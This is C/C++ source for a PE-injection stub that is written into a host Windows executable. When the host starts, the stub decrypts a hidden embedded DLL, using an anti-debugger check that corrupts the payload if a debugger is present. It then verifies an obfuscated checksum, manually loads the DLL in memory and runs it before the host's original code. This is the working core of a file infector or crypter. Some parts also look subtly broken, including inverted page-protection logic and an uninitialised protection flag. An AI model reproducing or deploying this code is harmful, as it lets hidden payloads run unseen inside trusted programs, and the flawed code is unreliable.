#include "PEInject.h"

typedef void (WINAPI *WINSTARTFUNC)(void);
typedef DWORD (WINAPI *DLLMAIN)(DWORD, DWORD, DWORD);
typedef LPVOID (WINAPI *VIRTUALALLOC)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI *VIRTUALFREE)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
typedef BOOL (WINAPI *VIRTUALPROTECT)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

#define GET_HEADER_DICTIONARY(module, idx)	&module->OptionalHeader.DataDirectory[idx]

#ifndef IMAGE_SIZEOF_BASE_RELOCATION
#define IMAGE_SIZEOF_BASE_RELOCATION (sizeof(IMAGE_BASE_RELOCATION))
#endif 

#pragma optimize("", off)
#pragma code_seg(".gacode")

__forceinline void _MEMSET_( void *_dst, int _val, size_t _sz )
{
	while ( _sz ) ((BYTE *)_dst)[--_sz] = _val;
}

__forceinline void _MEMCPY_( void *_dst, void *_src, size_t _sz )
{
	while ( _sz-- ) ((BYTE *)_dst)[_sz] = ((BYTE *)_src)[_sz];
}

__forceinline BOOL _MEMCMP_( void *_src1, void *_src2, size_t _sz )
{
	while ( _sz-- )
	{
		if ( ((BYTE *)_src1)[_sz] != ((BYTE *)_src2)[_sz] )
			return FALSE;
	}

	return TRUE;
}

__forceinline size_t _STRLEN_(char *_src)
{
	size_t count = 0;

	while( _src && *_src++ ) count++;

	return count;
}

__forceinline int _STRCMP_(char *_src1, char *_src2)
{
	size_t sz = _STRLEN_(_src1);

	if ( _STRLEN_(_src1) != _STRLEN_(_src2) )
		return 1;

	return _MEMCMP_(_src1, _src2, sz ) ? 0 :  1;
}

#define S11 7
#define S12 12
#define S13 17
#define S14 22
#define S21 5
#define S22 9
#define S23 14
#define S24 20
#define S31 4
#define S32 11
#define S33 16
#define S34 23
#define S41 6
#define S42 10
#define S43 15
#define S44 21

#define PEIROTATE(x, n) ((x << n) | (x >> (32-n)))
#define PEIROTATER(x, n) ((x << n) | (x >> (32-(32-n))))
#define PEI1(x,y,z) (x&y|~x&z)
#define PEI2(x,y,z) (x&y|x&~z)
#define PEI3(x,y,z) (x^y^z)
#define PEI4(x,y,z) (y^(x | ~z))
#define PEIROUND1(ret, n, i, s, ac) ret = PEIROTATE(i ^ PEI1(n,ac,ret) + ret ^ ac, s) + PEIROTATE((ret + ac), s) & ~3;
#define PEIROUND2(ret, n, i, s, ac) ret = PEIROTATE(i ^ PEI2(n,ac,ret) + ret ^ ac, s) + (~(PEIROTATE((ret + ac), s)));
#define PEIROUND3(ret, n, i, s, ac) ret = PEIROTATE(i ^ PEI3(n,ac,ret) + ret ^ ac, s) + PEIROTATE((ret + ac), s) & ~3;
#define PEIROUND4(ret, n, i, s, ac) ret = PEIROTATE(i ^ PEI3(n,ac,ret) + ret ^ ac, s) + (~(PEIROTATE((ret + ac), s)));

__forceinline unsigned int _PEI_CHECKSUM_(char *data, int size)
{
	unsigned int ret = 0x67452301 ^ 0xefcdab89 ^ 0x98badcfe ^ 0x10325476;

	for (int i = 0; i < size; i += 4)
	{
		unsigned int n = *((DWORD*)&data[i]);

		/* Round 1 */
		PEIROUND1(ret, n, i, S11, 0xd76aa478); /* 1 */
		PEIROUND1(ret, n, i, S12, 0xe8c7b756); /* 2 */
		PEIROUND1(ret, n, i, S13, 0x242070db); /* 3 */
		PEIROUND1(ret, n, i, S14, 0xc1bdceee); /* 4 */
		PEIROUND1(ret, n, i, S11, 0xf57c0faf); /* 5 */
		PEIROUND1(ret, n, i, S12, 0x4787c62a); /* 6 */
		PEIROUND1(ret, n, i, S13, 0xa8304613); /* 7 */
		PEIROUND1(ret, n, i, S14, 0xfd469501); /* 8 */
		PEIROUND1(ret, n, i, S11, 0x698098d8); /* 9 */
		PEIROUND1(ret, n, i, S12, 0x8b44f7af); /* 10 */
		PEIROUND1(ret, n, i, S13, 0xffff5bb1); /* 11 */
		PEIROUND1(ret, n, i, S14, 0x895cd7be); /* 12 */
		PEIROUND1(ret, n, i, S11, 0x6b901122); /* 13 */
		PEIROUND1(ret, n, i, S12, 0xfd987193); /* 14 */
		PEIROUND1(ret, n, i, S13, 0xa679438e); /* 15 */
		PEIROUND1(ret, n, i, S14, 0x49b40821); /* 16 */

		/* Round 2 */
		PEIROUND2(ret, n, i, S21, 0xf61e2562); /* 17 */
		PEIROUND2(ret, n, i, S22, 0xc040b340); /* 18 */
		PEIROUND2(ret, n, i, S23, 0x265e5a51); /* 19 */
		PEIROUND2(ret, n, i, S24, 0xe9b6c7aa); /* 20 */
		PEIROUND2(ret, n, i, S21, 0xd62f105d); /* 21 */
		PEIROUND2(ret, n, i, S22,  0x2441453); /* 22 */
		PEIROUND2(ret, n, i, S23, 0xd8a1e681); /* 23 */
		PEIROUND2(ret, n, i, S24, 0xe7d3fbc8); /* 24 */
		PEIROUND2(ret, n, i, S21, 0x21e1cde6); /* 25 */
		PEIROUND2(ret, n, i, S22, 0xc33707d6); /* 26 */
		PEIROUND2(ret, n, i, S23, 0xf4d50d87); /* 27 */
		PEIROUND2(ret, n, i, S24, 0x455a14ed); /* 28 */
		PEIROUND2(ret, n, i, S21, 0xa9e3e905); /* 29 */
		PEIROUND2(ret, n, i, S22, 0xfcefa3f8); /* 30 */
		PEIROUND2(ret, n, i, S23, 0x676f02d9); /* 31 */
		PEIROUND2(ret, n, i, S24, 0x8d2a4c8a); /* 32 */

		/* Round 3 */
		PEIROUND3(ret, n, i, S31, 0xfffa3942); /* 33 */
		PEIROUND3(ret, n, i, S32, 0x8771f681); /* 34 */
		PEIROUND3(ret, n, i, S33, 0x6d9d6122); /* 35 */
		PEIROUND3(ret, n, i, S34, 0xfde5380c); /* 36 */
		PEIROUND3(ret, n, i, S31, 0xa4beea44); /* 37 */
		PEIROUND3(ret, n, i, S32, 0x4bdecfa9); /* 38 */
		PEIROUND3(ret, n, i, S33, 0xf6bb4b60); /* 39 */
		PEIROUND3(ret, n, i, S34, 0xbebfbc70); /* 40 */
		PEIROUND3(ret, n, i, S31, 0x289b7ec6); /* 41 */
		PEIROUND3(ret, n, i, S32, 0xeaa127fa); /* 42 */
		PEIROUND3(ret, n, i, S33, 0xd4ef3085); /* 43 */
		PEIROUND3(ret, n, i, S34,  0x4881d05); /* 44 */
		PEIROUND3(ret, n, i, S31, 0xd9d4d039); /* 45 */
		PEIROUND3(ret, n, i, S32, 0xe6db99e5); /* 46 */
		PEIROUND3(ret, n, i, S33, 0x1fa27cf8); /* 47 */
		PEIROUND3(ret, n, i, S34, 0xc4ac5665); /* 48 */

		/* Round 4 */
		PEIROUND4(ret, n, i, S41, 0xf4292244); /* 49 */
		PEIROUND4(ret, n, i, S42, 0x432aff97); /* 50 */
		PEIROUND4(ret, n, i, S43, 0xab9423a7); /* 51 */
		PEIROUND4(ret, n, i, S44, 0xfc93a039); /* 52 */
		PEIROUND4(ret, n, i, S41, 0x655b59c3); /* 53 */
		PEIROUND4(ret, n, i, S42, 0x8f0ccc92); /* 54 */
		PEIROUND4(ret, n, i, S43, 0xffeff47d); /* 55 */
		PEIROUND4(ret, n, i, S44, 0x85845dd1); /* 56 */
		PEIROUND4(ret, n, i, S41, 0x6fa87e4f); /* 57 */
		PEIROUND4(ret, n, i, S42, 0xfe2ce6e0); /* 58 */
		PEIROUND4(ret, n, i, S43, 0xa3014314); /* 59 */
		PEIROUND4(ret, n, i, S44, 0x4e0811a1); /* 60 */
		PEIROUND4(ret, n, i, S41, 0xf7537e82); /* 61 */
		PEIROUND4(ret, n, i, S42, 0xbd3af235); /* 62 */
		PEIROUND4(ret, n, i, S43, 0x2ad7d2bb); /* 63 */
		PEIROUND4(ret, n, i, S44, 0xeb86d391); /* 64 */

		ret ^= n - i + ret & 3;
	}

	return ret ^ size;
}

#define XDPEIROUND(n, size, d, k) \
	n -= k ^ size; \
	n ^= (k << d); \
	n ^= k;

__forceinline void _PEI_DEC_(unsigned int *keys, char *data, int size)
{
	for (int i = 0; i + 4 < size; i += 4)
	{
		unsigned int n = *((DWORD*)&data[i]);

		XDPEIROUND(n, size, i % 7, keys[i % 7]);

		_asm
		{
			mov eax, fs:[30h]
			mov eax, [eax+68h]
			and eax, 0x70
			xor [n], eax
		}

		*((DWORD*)&data[i]) = n;
	}
}

extern "C" int __stdcall NewEntryPoint_Start(DWORD dwDataSection)
{
	PEInjectHeader *peih = (PEInjectHeader *)dwDataSection;

	if (peih->Magic != 0x48AFB89D)
		return 0;

	VIRTUALALLOC	pfn_VirtualAlloc		= NULL;
	VIRTUALFREE		pfn_VirtualFree			= NULL;
	VIRTUALPROTECT	pfn_VirtualProtect		= NULL;

	peih->LoadLibraryPtr = (LOADLIBRARY)*((DWORD*)peih->LoadLibraryPtr);
	peih->GetProcAddressPtr = (GETPROCADDRESS)*((DWORD*)peih->GetProcAddressPtr);

	HMODULE hKernel32 = peih->LoadLibraryPtr(peih->Strings[PEI_STR_KERNEL32]);

	pfn_VirtualAlloc = (VIRTUALALLOC)peih->GetProcAddressPtr(hKernel32, peih->Strings[PEI_STR_VIRTUAL_ALLOC]);
	pfn_VirtualFree = (VIRTUALFREE)peih->GetProcAddressPtr(hKernel32, peih->Strings[PEI_STR_VIRTUAL_FREE]);
	pfn_VirtualProtect = (VIRTUALPROTECT)peih->GetProcAddressPtr(hKernel32, peih->Strings[PEI_STR_VIRTUAL_PROTECT]);

	char *gals = (char *)dwDataSection + sizeof(PEInjectHeader);
	PGALSHeader header = (PGALSHeader)(gals);
	PGALSSection sections = (PGALSSection)(gals + sizeof(GALSHeader));

	_PEI_DEC_(peih->GALSKey, gals + sizeof(PEInjectHeader), header->GalsSize - sizeof(PEInjectHeader));
	
	if (_PEI_CHECKSUM_(gals, header->GalsSize) != peih->GALSChecksum)
		return 0;

	unsigned char *codeBase = (unsigned char *)pfn_VirtualAlloc(NULL,
		header->SizeOfImage,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE);
	
	_MEMSET_(codeBase, 0, header->SizeOfImage);
	
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)codeBase;
	dos->e_magic = IMAGE_DOS_SIGNATURE;
	dos->e_lfanew = sizeof(IMAGE_DOS_HEADER);

	PIMAGE_NT_HEADERS32 ntheader = (PIMAGE_NT_HEADERS32)(codeBase + sizeof(IMAGE_DOS_HEADER));
	
	ntheader->Signature = IMAGE_NT_SIGNATURE;
	ntheader->OptionalHeader.Magic = IMAGE_NT_OPTIONAL_HDR32_MAGIC;

	ntheader->FileHeader.NumberOfSections = header->NumberOfSections;
	
	ntheader->OptionalHeader.ImageBase = (DWORD)codeBase;
	ntheader->OptionalHeader.AddressOfEntryPoint = header->EntryPoint;
	ntheader->OptionalHeader.SizeOfImage = header->SizeOfImage;
	ntheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress = header->ExportsVA;
	ntheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = header->ImportsVA;
	ntheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress = header->ResourcesVA;
	ntheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = header->RelocationsVA;
	
	ntheader->OptionalHeader.NumberOfRvaAndSizes = IMAGE_NUMBEROF_DIRECTORY_ENTRIES;
	ntheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].Size = header->SizeOfImage - header->ResourcesVA;

	ntheader->OptionalHeader.MajorImageVersion = 4;
	ntheader->OptionalHeader.MinorImageVersion = 0;
	
	PIMAGE_SECTION_HEADER ntsections = (PIMAGE_SECTION_HEADER)(((DWORD)ntheader) + sizeof(IMAGE_NT_HEADERS32));
	for (int i = 0; i < header->NumberOfSections; i++)
	{
		PIMAGE_SECTION_HEADER ntsec = &ntsections[i];
		PGALSSection sec = &sections[i];

		ntsec->Characteristics = sec->Flags;
		ntsec->SizeOfRawData = sec->RawSize;
		ntsec->PointerToRawData = NULL;
		ntsec->VirtualAddress = sec->VirtualAddress;
		ntsec->Misc.VirtualSize = sec->VirtualSize;
		ntsec->Misc.PhysicalAddress = (DWORD)codeBase + sec->VirtualAddress;
		
		_MEMCPY_((void *)ntsec->Misc.PhysicalAddress, (void *)(gals + sec->RawAddress), sec->RawSize);
	}
	
	DWORD locationDelta = (DWORD)(codeBase - header->ImageBase);
	if (locationDelta != 0)
	{
		DWORD i;

		PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(ntheader, IMAGE_DIRECTORY_ENTRY_BASERELOC);
		PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION) (codeBase + directory->VirtualAddress);
		
		for (; relocation->VirtualAddress > 0; ) 
		{
			unsigned char *dest = codeBase + relocation->VirtualAddress;
			unsigned short *relInfo = (unsigned short *)((unsigned char *)relocation + IMAGE_SIZEOF_BASE_RELOCATION);
			DWORD numberOfRelocs = ((relocation->SizeOfBlock-IMAGE_SIZEOF_BASE_RELOCATION) / 2);

			for (i = 0; i < numberOfRelocs; i++, relInfo++) 
			{
				DWORD *patchAddrHL;
				int type, offset;

				type = *relInfo >> 12;
				offset = *relInfo & 0xfff;

				switch (type)
				{
				case IMAGE_REL_BASED_ABSOLUTE:
					break;

				case IMAGE_REL_BASED_HIGHLOW:
					patchAddrHL = (DWORD *) (dest + offset);
					*patchAddrHL += locationDelta;
					break;

				default:
					break;
				}
			}
			
			relocation = (PIMAGE_BASE_RELOCATION) (((char *) relocation) + relocation->SizeOfBlock);
		}
	}
	
	{
		PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(ntheader, IMAGE_DIRECTORY_ENTRY_IMPORT);
		PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR) (codeBase + directory->VirtualAddress);
		
		for (; importDesc->Name; importDesc++) 
		{
			DWORD *thunkRef;
			FARPROC *funcRef;
			HMODULE handle = peih->LoadLibraryPtr((LPCSTR) (codeBase + importDesc->Name));

			if (importDesc->OriginalFirstThunk) 
			{
				thunkRef = (DWORD *) (codeBase + importDesc->OriginalFirstThunk);
				funcRef = (FARPROC *) (codeBase + importDesc->FirstThunk);
			}
			else 
			{
				thunkRef = (DWORD *) (codeBase + importDesc->FirstThunk);
				funcRef = (FARPROC *) (codeBase + importDesc->FirstThunk);
			}

			for (; *thunkRef; thunkRef++, funcRef++) 
			{
				if (IMAGE_SNAP_BY_ORDINAL(*thunkRef)) 
				{
					*funcRef = (FARPROC)peih->GetProcAddressPtr(handle, (LPCSTR)IMAGE_ORDINAL(*thunkRef));
				} 
				else 
				{
					PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME) (codeBase + (*thunkRef));
					*funcRef = (FARPROC)peih->GetProcAddressPtr(handle, (LPCSTR)&thunkData->Name);
				}
			}
		}
	}
	
	for (int i = 0; i < header->NumberOfSections; i++)
	{
		PIMAGE_SECTION_HEADER ntsec = &ntsections[i];
		PGALSSection sec = &sections[i];

		bool executable = (ntsec->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
		bool readable = (ntsec->Characteristics & IMAGE_SCN_MEM_READ) != 0;
		bool writeable = (ntsec->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;

		DWORD protect, oldProtect, size;

		if (executable)
		{
			if (readable)
			{
				if (writeable)
					protect |= PAGE_READWRITE;
				else
					protect |= PAGE_READONLY;
			}
			else
			{
				if (writeable)
					protect |= PAGE_WRITECOPY;
				else
					protect |= PAGE_NOACCESS;
			}
		}
		else
		{
			if (readable)
			{
				if (writeable)
					protect |= PAGE_EXECUTE_READWRITE;
				else
					protect |= PAGE_EXECUTE_READ;
			}
			else
			{
				if (writeable)
					protect |= PAGE_EXECUTE_WRITECOPY;
				else
					protect |= PAGE_EXECUTE;
			}
		}

		if (ntsec->Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
			protect |= PAGE_NOCACHE;

		size = ntsec->SizeOfRawData;
		if (size == 0)
		{
			if (ntsec->Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA) 
			{
				size = ntheader->OptionalHeader.SizeOfInitializedData;
			} 
			else if (ntsec->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) 
			{
				size = ntheader->OptionalHeader.SizeOfUninitializedData;
			}
		}

		if (size > 0)
		{
			pfn_VirtualProtect((LPVOID)ntsec->Misc.PhysicalAddress, size, protect, &oldProtect);
		}
	}

	DLLMAIN pfn_DllEntryPoint = (DLLMAIN)(ntheader->OptionalHeader.ImageBase + ntheader->OptionalHeader.AddressOfEntryPoint);
	WINSTARTFUNC pfn_OriginalEntryPoint = (WINSTARTFUNC)(peih->ImageBase + peih->OEP);

	pfn_DllEntryPoint((DWORD)&pfn_OriginalEntryPoint, DLL_PROCESS_ATTACH, 0);
	pfn_OriginalEntryPoint();
	pfn_DllEntryPoint((DWORD)codeBase, DLL_PROCESS_DETACH, 0);

	pfn_VirtualFree(codeBase, ntheader->OptionalHeader.ImageBase, MEM_RELEASE);

	return 0;
}

extern "C" int __stdcall NewEntryPoint_End()
{
   return 0;
}

#pragma code_seg()
#pragma optimize("", on)
